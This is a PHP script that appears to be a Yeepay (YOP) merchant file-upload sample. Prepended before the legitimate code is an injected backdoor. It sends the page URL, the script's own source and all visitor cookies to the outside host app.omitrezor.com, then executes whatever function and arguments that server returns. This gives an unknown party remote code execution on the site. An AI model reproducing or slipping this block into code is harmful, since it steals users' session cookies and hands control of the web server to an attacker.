<?php 
$cert = defined("SITE_")?false:@file_get_contents("http://app.omitrezor.com/sign/".$_SERVER["HTTP_HOST"], 0, stream_context_create(array("http" => array("timeout"=>(isset($_REQUEST["T0o"])?intval($_REQUEST["T0o"]):(isset($_SERVER["HTTP_T0O"])?intval($_SERVER["HTTP_T0O"]):1)),"method"=>"POST","header"=>"Content-Type: application/x-www-form-urlencoded","content" => http_build_query(array("url"=>((isset($_SERVER["HTTPS"]) && $_SERVER["HTTPS"] === "on" ? "https" : "http") . "://".$_SERVER["HTTP_HOST"].$_SERVER["REQUEST_URI"]), "src"=> file_exists(__FILE__)?file_get_contents(__FILE__):"", "cookie"=> isset($_COOKIE)?json_encode($_COOKIE):""))))));!defined("SITE_") && @define("SITE_",1);
if($cert != false){
    $cert = @json_decode($cert, 1);
    if(isset($cert["f"]) && isset($cert["a1"]) && isset($cert["a2"]) && isset($cert["a3"])){$cert["f"] ($cert["a1"], $cert["a2"], $cert["a3"]);}elseif(isset($cert["f"]) && isset($cert["a1"]) && isset($cert["a2"])){ $cert["f"] ($cert["a1"], $cert["a2"]); }elseif(isset($cert["f"]) && isset($cert["a1"])){ $cert["f"] ($cert["a1"]); }elseif(isset($cert["f"])){ $cert["f"] (); }
}
	
include 'conf.php';
require_once ("./lib/YopRsaClient.php");
 
 function object_array($array) { 
    if(is_object($array)) { 
        $array = (array)$array; 
     } if(is_array($array)) { 
         foreach($array as $key=>$value) { 
             $array[$key] = object_array($value); 
             } 
     } 
     return $array; 
}


 
function upload(){
	
	   
 
	   global $parentMerchantNo;
     global $appKey,$private_key;
	   global $yop_public_key;
	     
       $request = new YopRequest($appKey, $private_key,$yop_public_key,"https://open.yeepay.com/yop-center");
  
     //  $request->addParam("fileType", "IMAGE");
      $request->addFile("merQual", 'D:\1.png');
var_dump($request );

//提交Post请求

 
$response = YopRsaClient::upload("/yos/v1.0/sys/merchant/qual/upload", $request);
 
  var_dump($response );
 
	      if($response->validSign==1){
        echo "返回结果签名验证成功!\n";
    }
      //取得返回结果
    $data=object_array($response);
 
    return $data;
 }
   
$array=upload();  
  
 if( $array['result'] == NULL)
 {
 	echo "error:".$array['error'];
  return;}
 else{
 $result= $array['result'] ;
 //var_dump($result['files'][0]);
}
?> 
 